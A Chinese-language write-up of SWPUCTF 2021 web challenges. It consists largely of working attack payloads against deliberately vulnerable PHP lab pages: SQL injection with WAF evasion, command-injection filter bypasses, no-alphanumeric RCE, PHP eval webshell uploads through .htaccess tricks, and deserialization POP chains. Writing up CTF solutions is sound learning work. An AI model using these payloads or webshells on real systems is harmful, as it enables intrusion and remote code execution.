# SWPUCTF 2021

## Web

### jicao

```php
<?php
highlight_file('index.php');
include("flag.php");
$id=$_POST['id'];
$json=json_decode($_GET['json'],true);
if ($id=="wllmNB"&&$json['x']=="wllm")
{echo $flag;}
?>
```

Payload 如下

```
Body: id=wllmNB
Param: json={"x":"wllm"}
```

### easy\_md5

```php
<?php 
 highlight_file(__FILE__);
 include 'flag2.php';
 
if (isset($_GET['name']) && isset($_POST['password'])){
    $name = $_GET['name'];
    $password = $_POST['password'];
    if ($name != $password && md5($name) == md5($password)){
        echo $flag;
    }
    else {
        echo "wrong!";
    }
 
}
else {
    echo 'wrong!';
}
?>
```

Payload 如下

```
Body: password[]=2
Param: name[]=1
```

### easy\_sql

打开页面后 title 存在提示 参数是 `wllm` 。

```bash
$ python sqlmap.py  -u http://node2.anna.nssctf.cn:28574/?wllm=1 --dbs
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] test
[*] test_db
$ python sqlmap.py  -u http://node2.anna.nssctf.cn:28574/?wllm=1 -D test_db --tables
Database: test_db
[2 tables]
+---------+
| test_tb |
| users   |
+---------+
$ python sqlmap.py  -u http://node2.anna.nssctf.cn:28574/?wllm=1 -D test_db -T test_tb --columns
Database: test_db
Table: test_tb
[2 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| flag   | varchar(50) |
| id     | int(11)     |
+--------+-------------+
$ python sqlmap.py  -u http://node2.anna.nssctf.cn:28574/?wllm=1 -D test_db -T test_tb -C flag --dump
Database: test_db
Table: test_tb
[1 entry]
+----------------------------------------------+
| flag                                         |
+----------------------------------------------+
| NSSCTF{66c831a1-4505-4bcd-8b89-b9620b715aeb} |
+----------------------------------------------+
```

### include

Payload 如下

```
file=php://filter/convert.base64-encode/resource=flag.php
```

### caidao

蚁剑利用 `$_POST['wllm']` 一把梭。

### easyrce

```
url=system("ls%20/");
```

回显 `bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var` ，

```
url=system("cat%20/flllllaaaaaaggggggg");
```

得到 flag。

### babyrce

```php
<?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if($_COOKIE['admin']==1) 
{
    include "../next.php";
}
else
    echo "小饼干最好吃啦！";
?>
```

设置 Cookie `admin=1` ，即可到达下一关 。

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/ /", $ip)){
      die('nonono');
  }
  $a = shell_exec($ip);
  echo $a;
}
?>
```

通过分析可得空格被过滤，可以通过 `$IFS$1` 来绕过，构造 Payload 如下

```
url=ls$IFS$1/
```

得到回显 `bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var` ，

```
url=cat$IFS$1/flllllaaaaaaggggggg
```

得到 flag。

### hardrce

```php
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm'])) {
  $wllm = $_GET['wllm'];
  $blacklist = [' ','\t','\r','\n','\+','\[','\^','\]','\"','\-','\$','\*','\?','\<','\>','\=','\`',];
  foreach ($blacklist as $blackitem) {
    if (preg_match('/' . $blackitem . '/m', $wllm)) {
      die("LTLT说不能用这些奇奇怪怪的符号哦！");
    }
  }
  if(preg_match('/[a-zA-Z]/is',$wllm)) {
    die("Ra's Al Ghul说不能用字母哦！");
  }
  echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
  eval($wllm);
} else {
  echo "蔡总说：注意审题！！！";
}
?>
```

发现没有过滤 `%` ，又不能用字母，那就只能尝试下 Urlencode 取反绕过了。

```php
<?php
$a = 'system';
$b = 'ls$IFS$1/';
echo '(~'.urlencode(~$a).')(~'.urlencode(~$b).');';
// (~%8C%86%8C%8B%9A%92)(~%93%8C%DB%B6%B9%AC%DB%CE%D0);
```

构造 Payload 如下

```
wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DB%B6%B9%AC%DB%CE%D0);
```

可以得到回显如下

```
bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

通过构造 Urlencode 取反后通过如下 Payload 就可以得到 flag 了。

```php
<?php
$a = 'system';
$b = 'cat$IFS$1/flllllaaaaaaggggggg';
echo '(~'.urlencode(~$a).')(~'.urlencode(~$b).');';
// (~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DB%B6%B9%AC%DB%CE%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);
```

```
wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DB%B6%B9%AC%DB%CE%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);
```

### hardrce\_3

```php
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm'])) {
  $wllm = $_GET['wllm'];
  $blacklist = [' ','\^','\~','\|'];
  foreach ($blacklist as $blackitem) {
    if (preg_match('/' . $blackitem . '/m', $wllm)) {
      die("小伙子只会异或和取反？不好意思哦LTLT说不能用！！");
    }
  }
  if(preg_match('/[a-zA-Z0-9]/is',$wllm)) {
    die("Ra'sAlGhul说用字母数字是没有灵魂的！");
  }
  echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
  eval($wllm);
} else {
  echo "蔡总说：注意审题！！！";
}
?>
```

这是一道无字母数字 rce ，根据百度一番查找找到用自增的方法来解决

> https://blog.csdn.net/qq\_61778128/article/details/127063407

```
<?php
$_=[].'';   //得到"Array"
$___ = $_[$__];   //得到"A"，$__没有定义，默认为False也即0，此时$___="A"
$__ = $___;   //$__="A"
$_ = $___;   //$_="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
$___ .= $__;   //$___="AS"
$___ .= $__;   //$___="ASS"
$__ = $_;   //$__="A"
$__++;$__++;$__++;$__++;   //得到"E"，此时$__="E"
$___ .= $__;   //$___="ASSE"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;   //得到"R"，此时$__="R"
$___ .= $__;   //$___="ASSER"
$__++;$__++;   //得到"T"，此时$__="T"
$___ .= $__;   //$___="ASSERT"
$__ = $_;   //$__="A"
$____ = "_";   //$____="_"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"P"，此时$__="P"
$____ .= $__;   //$____="_P"
$__ = $_;   //$__="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"O"，此时$__="O"
$____ .= $__;   //$____="_PO"
$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
$____ .= $__;   //$____="_POS"
$__++;   //得到"T"，此时$__="T"
$____ .= $__;   //$____="_POST"
$_ = $$____;   //$_=$_POST
$___($_[_]);
```

这里放一个压缩版（

```php
<?php
$_=[].'';$___=$_[$__];$__=$___;$_=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;$___.=$__;$__++;$__++;$___.=$__;$__=$_;$____="_";$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__++;$__++;$__++;$__++;$____.=$__;$__++;$____.=$__;$_=$$____;$___($_[_]);
```

将以上内容进行一次 Urlencode 编码得到以下内容，将其作为 Payload 。

```
wllm=%24%5F%3D%5B%5D%2E%27%27%3B%24%5F%5F%5F%3D%24%5F%5B%24%5F%5F%5D%3B%24%5F%5F%3D%24%5F%5F%5F%3B%24%5F%3D%24%5F%5F%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%5F%5F%3D%22%5F%22%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%3D%24%24%5F%5F%5F%5F%3B%24%5F%5F%5F%28%24%5F%5B%5F%5D%29%3B
```

但是发现并没有用，通过百度看发现还需要利用 `file_put_contents()` 函数来绕过 disable\_function。

所以需要构造 Payload 如下（body 部分）

```
_=file_put_contents('1.php','<?php eval($_POST[1]); ?>');
```

然后访问 `./1.php` 发现文件成功写入后尝试用蚁剑连接，连接成功后发现 flag 就在根目录 `/flag` 中。

### finalrce

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['url'])) {
  $url=$_GET['url'];
  if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url)) {
    echo "Sorry,you can't use this.";
  } else {
    echo "Can you see anything?";
    exec($url);
  }
}
```

通过 `tee` 和 管道符 可以将值输出到文件中，构造 Payload 如下

```
url=l\s / | tee 1.html
```

访问 `./1.html` 可以得到以下内容

```
a_here_is_a_f1ag bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

构造以下 Payload 获取 flag ，需要注意 `la` 和 `cat` 被过滤了，需要使用 `\` 进行绕过

```
url=c\at /flllll\aaaaaaggggggg | tee 2.html
```

访问 `./2.html` 就可以得到 flag 了。

### Do\_you\_know\_http

修改以下两项

```http
User-Agent: WLLM
X-Forwarded-For: 127.0.0.1
```

即可得到 flag。

### ez\_unserialize

先用 dirsearch 找找文件\~

```bash
$ python dirsearch.py -u http://node2.anna.nssctf.cn:28104/
[11:43:36] 200 -    0B  - /flag.php
[11:49:43] 200 -   35B  - /robots.txt
```

访问 `/robots.txt` 可以得到 `/cl45s.php` ，访问可以得到以下代码。

```php
<?php

error_reporting(0);
show_source("cl45s.php");

class wllm{

    public $admin;
    public $passwd;

    public function __construct(){
        $this->admin ="user";
        $this->passwd = "123456";
    }

        public function __destruct(){
        if($this->admin === "admin" && $this->passwd === "ctf"){
            include("flag.php");
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}

$p = $_GET['p'];
unserialize($p);

?>
```

这是一道反序列题，先进行序列化构造。

```php
<?php
class wllm{

  public $admin;
  public $passwd;

  public function __construct(){
    $this->admin ="user";
    $this->passwd = "123456";
  }

  public function __destruct(){
    if($this->admin === "admin" && $this->passwd === "ctf"){
      include("flag.php");
      echo $flag;
    }else{
      echo $this->admin;
      echo $this->passwd;
      echo "Just a bit more!";
    }
  }
}

$a = new wllm();
$a->admin = "admin";
$a->passwd = "ctf";
echo serialize($a)
// O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```

得到返回的值后构造 Payload 如下

```
p=O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```

就得到 flag 。

### easyupload1.0

构造图片马

```http
POST /upload.php HTTP/1.1

------WebKitFormBoundary8eWcQ5xJ0L37mCSt
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg

<?php eval($_POST[1]); ?>
------WebKitFormBoundary8eWcQ5xJ0L37mCSt
```

上传后得到回显 `./upload/shell.php` ，通过蚁剑一把梭发现根目录的 flag 是假的，那就找找环境变量罢，通过构造 Payload 如下

```
1=phpinfo();
```

F5 查找发现 flag 就在这里面。

### easyupload2.0

构造图片马

```http
POST /upload.php HTTP/1.1

------WebKitFormBoundary8eWcQ5xJ0L37mCSt
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg

<?php eval($_POST[1]); ?>
------WebKitFormBoundary8eWcQ5xJ0L37mCSt
```

上传后得到回显 `php是不行滴` ，那就尝试修改后缀为其他（比如 `.phtml` ），上传成功后直接构造 Payload 如下

```
1=phpinfo();
```

F5 查找发现 flag 就在这里面。

### easyupload3.0

这次比上一次来说过滤了很多，改后缀名已经无法绕过了，那就试试改 `.htaccess` 罢。

```http
POST /upload.php HTTP/1.1

------WebKitFormBoundaryfmADKqeYk0Yxw93y
Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
Content-Type: image/png

<FilesMatch "png">
setHandler application/x-httpd-php
</FilesMatch>
------WebKitFormBoundaryfmADKqeYk0Yxw93y
```

发现上传成功，那就上传个图片马罢。

```http
POST /upload.php HTTP/1.1

------WebKitFormBoundaryfmADKqeYk0Yxw93y
Content-Disposition: form-data; name="uploaded"; filename="1.png"
Content-Type: image/png

<?php eval($_POST[1]); ?>
------WebKitFormBoundaryfmADKqeYk0Yxw93y
```

上传成功后直接构造 Payload 如下

```
1=phpinfo();
```

F5 查找发现 flag 就在这里面。

### no\_wakeup

根据题目猜测是需要绕过反序列化时候的 `__wakeup()` 魔术方法。

```php
<?php

header("Content-type:text/html;charset=utf-8");
error_reporting(0);
show_source("class.php");

class HaHaHa{


        public $admin;
        public $passwd;

        public function __construct(){
            $this->admin ="user";
            $this->passwd = "123456";
        }

        public function __wakeup(){
            $this->passwd = sha1($this->passwd);
        }

        public function __destruct(){
            if($this->admin === "admin" && $this->passwd === "wllm"){
                include("flag.php");
                echo $flag;
            }else{
                echo $this->passwd;
                echo "No wake up";
            }
        }
    }

$Letmeseesee = $_GET['p'];
unserialize($Letmeseesee);

?>
```

可以通过修改反序列化对象的参数就可以绕过该魔术方法了，先进行序列化构造。

```php
<?php
class HaHaHa{


  public $admin;
  public $passwd;

  public function __construct(){
    $this->admin ="user";
    $this->passwd = "123456";
  }

  public function __wakeup(){
    $this->passwd = sha1($this->passwd);
  }

  public function __destruct(){
    if($this->admin === "admin" && $this->passwd === "wllm"){
      include("flag.php");
      echo $flag;
    }else{
      echo $this->passwd;
      echo "No wake up";
    }
  }
}

$a = new HaHaHa();
$a->admin = "admin";
$a->passwd = "wllm";
echo serialize($a);
```

可以得到值

```
O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```

将对象参数个数 `2` 改成 `3` 即可绕过，即构造 Payload 如下

```
p=O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```

### PseudoProtocols

题目标题为 伪协议 ，那就是一道 伪协议 的题目力。

题目存在 Param `wllm` ，构造 Payload 如下

```
wllm=php://filter/convert.base64-encode/resource=hint.php
```

就可以得到 `hint.php` 的代码如下

```php
<?php
//go to /test2222222222222.php
?>
```

前往提示内的文件可以得到以下代码

```php
<?php
ini_set("max_execution_time", "180");
show_source(__FILE__);
include('flag.php');
$a= $_GET["a"];
if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
    echo "success\n";
    echo $flag;
}
?>
```

需要使得 `a` 的值为 `I want flag` ，先将 `I want flag` 进行 base64 编码得到 `SSB3YW50IGZsYWc=` ，再构造 Payload 如下

```
a=data://text/plain;base64,SSB3YW50IGZsYWc=
```

就可以得到 flag 了。

### error

根据题目猜测是 SQL 报错注入（？，试试 sqlmap。

```bash
$ python sqlmap.py -u http://node2.anna.nssctf.cn:28431/index.php?id=1 --dbs
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] test
[*] test_db
$ python sqlmap.py -u http://node2.anna.nssctf.cn:28431/index.php?id=1 -D test_db --tables
Database: test_db
[2 tables]
+---------+
| test_tb |
| users   |
+---------+
$ python sqlmap.py -u http://node2.anna.nssctf.cn:28431/index.php?id=1 -D test_db -T test_tb --columns
Database: test_db
Table: test_tb
[2 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| flag   | varchar(50) |
| id     | int(11)     |
+--------+-------------+
$ python sqlmap.py -u http://node2.anna.nssctf.cn:28431/index.php?id=1 -D test_db -T test_tb -C flag --dump
Database: test_db
Table: test_tb
[1 entry]
+----------------------------------------------+
| flag                                         |
+----------------------------------------------+
| NSSCTF{d9d7ae7c-5b01-461c-836a-4e0f784d9784} |
+----------------------------------------------+
```

### pop

```php
<?php

error_reporting(0);
show_source("index.php");

class w44m{

    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag(){
        if($this->admin === 'w44m' && $this->passwd ==='08067'){
            include('flag.php');
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

class w22m{
    public $w00m;
    public function __destruct(){
        echo $this->w00m;
    }
}

class w33m{
    public $w00m;
    public $w22m;
    public function __toString(){
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

$w00m = $_GET['w00m'];
unserialize($w00m);

?>
```

先构造序列化

```php
<?php
class w44m{

  private $admin = 'aaa';

  public function setAdmin(string $admin): void
  {
    $this->admin = $admin;
  }

  public function setPasswd(string $passwd): void
  {
    $this->passwd = $passwd;
  }
  protected $passwd = '123456';

  public function Getflag(){
    if($this->admin === 'w44m' && $this->passwd ==='08067'){
      include('flag.php');
      echo $flag;
    }else{
      echo $this->admin;
      echo $this->passwd;
      echo 'nono';
    }
  }
}

class w22m{
  public $w00m;
  public function __destruct(){
    echo $this->w00m;
  }
}

class w33m{
  public $w00m;
  public $w22m;
  public function __toString(){
    $this->w00m->{$this->w22m}();
    return 0;
  }
}

$a = new w22m();
$b = new w33m();
$c = new w44m();
$a->w00m = $b;
$b->w00m = $c;
$b->w22m = 'Getflag';
$c->setAdmin('w44m');
$c->setPasswd('08067');
echo urlencode(serialize($a));
// O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D
```

之后构造 Payload 如下即可得到 flag 。

```
w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D
```

### sql

题目中说明需要绕过 Waf ，那就先判断被过滤的字符，构造 Payload 如下

```
wllm=1' and 1=1%23
wllm=1'||1=1%23
wllm=1' or 1%23
```

回显提示存在非法字符，

```
wllm=1'||1#
```

此时回显并没有提示存在非法字符，可以推断出过滤了 `=` 和 `空格` 。

构造 Payload 如下

```
wllm=1'/**/order/**/by/**/1%23
wllm=1'/**/order/**/by/**/2%23
wllm=1'/**/order/**/by/**/3%23
wllm=1'/**/order/**/by/**/4%23
```

到 `4` 时出现报错，因此长度为 `3` 。

构造 Payload 如下

```
wllm=-1'/**/union/**/select/**/1,2,3%23
```

可以发现 `2,3` 有回显，构造 Payload 如下

```
wllm=-1'/**/union/**/select/**/1,database(),3%23
```

可以得到数据库名 `test_db` ，构造 Payload 如下

```
wllm=-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'test_db'),3%23
```

可以得到表名 `LTLT_flag, users` ，构造 Payload 如下（插曲：发现 and 也被过滤了）

```
wllm=-1'/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/'test_db'),3%23
```

可以得到列名 `id, flag, id, username` ，构造 Payload 如下

```
wllm=-1'/**/union/**/select/**/1,(select/**/flag/**/from/**/LTLT_flag/**/limit/**/0,1),3%23
```

可以得到 `NSSCTF{aeb148da-5efa` ，可以通过 `mid()` 来获取 flag 的其他部分，构造 Payload 如下

```
wllm=-1'/**/union/**/select/**/1,mid((select/**/flag/**/from/**/LTLT_flag/**/limit/**/0,1),21),3%23
wllm=-1'/**/union/**/select/**/1,mid((select/**/flag/**/from/**/LTLT_flag/**/limit/**/0,1),40),3%23
```

可以得到 `-430e-961b-ab03b3fb` 和 `2d32}` 拼起来就是 flag 了。
